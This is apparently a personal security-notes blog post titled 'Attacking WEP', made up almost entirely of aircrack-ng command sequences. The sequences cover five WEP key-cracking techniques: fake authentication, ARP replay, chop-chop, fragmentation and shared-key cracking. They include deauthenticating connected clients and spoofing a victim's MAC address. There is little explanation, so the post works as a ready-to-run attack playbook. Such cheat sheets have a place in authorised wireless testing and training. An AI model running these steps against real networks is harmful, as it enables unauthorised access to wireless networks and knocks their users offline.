---
description: >-
  Attacking WEP
title:  Attacking WEP   # Add title here
date: 2023-09-30 08:00:00 -0600                           # Change the date to match completion date
categories: [18 Wireless, Wireless Attacks]                     # Change Templates to Writeup
tags: [wireless, wep]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### WEP

#### Fake Authentication Attack
```bash
# Monitor Mode
airmon-ng start wlan0
# Capturing Traffic
airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
# Identifying our own MAC
macchanger --show wlan0mon
# Fake authentication attack
aireplay-ng -1 0 -a <BSSID> -h <nuestraMAC> -e <ESSID> wlan0mon
aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <nuestraMAC> wlan0mon
aircrack-ng –b <BSSID> <archivoPCAP>
```
#### ARP Replay Attack
```bash
# Monitor Mode
airmon-ng start wlan0
# Capturing Traffic
airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreCaptura> wlan0mon
# Identifying our own MAC
macchanger --show wlan0mon
aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <nuestraMAC> wlan0mon
aircrack-ng –b <BSSID> <archivoPCAP>
```
#### Chop Chop Attack
```bash
# Monitor Mode
airmon-ng start wlan0
# Capturing Traffic
airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
# Identifying our own MAC
macchanger --show wlan0mon
# Deauthentication attack
aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
aireplay-ng -4 –b <BSSID> -h <nuestraMAC> wlan0mon
 # Presionamos ‘y’ ;
packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
aireplay-ng -2 –r <FileName2> wlan0mon
aircrack-ng <archivoPCAP>
```
#### Fragmentation Attack
```bash
# Monitor Mode
airmon-ng start wlan0
# Capturing Traffic
airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
# Identifying our own MAC
macchanger --show wlan0mon
aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <nuestraMAC> wlan0mon
aireplay-ng -5 –b<BSSID> -h <nuestraMAC > wlan0mon
# Presionamos ‘y’ ;
packetforge-ng -0 –a <BSSID> -h <nuestraMAC> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
aireplay-ng -2 –r <FileName2> wlan0mon
aircrack-ng <archivoPCAP>
```
#### SKA Type Cracking
```bash
# Monitor Mode
airmon-ng start wlan0
# Capturing Traffic
airodump-ng –c <Canal_AP> --bssid <BSSID> -w <nombreArchivo> wlan0mon
# Deauthentication attack
aireplay-ng -0 10 –a <BSSID> -c <macVictima> wlan0mon
ifconfig wlan0mon down
macchanger –-mac <macVictima> wlan0mon
ifconfig wlan0mon up
aireplay-ng -3 –b <BSSID> -h <macFalsa> wlan0mon
aireplay-ng –-deauth 1 –a <BSSID> -h <macFalsa> wlan0mon
aircrack-ng <archivoPCAP>
```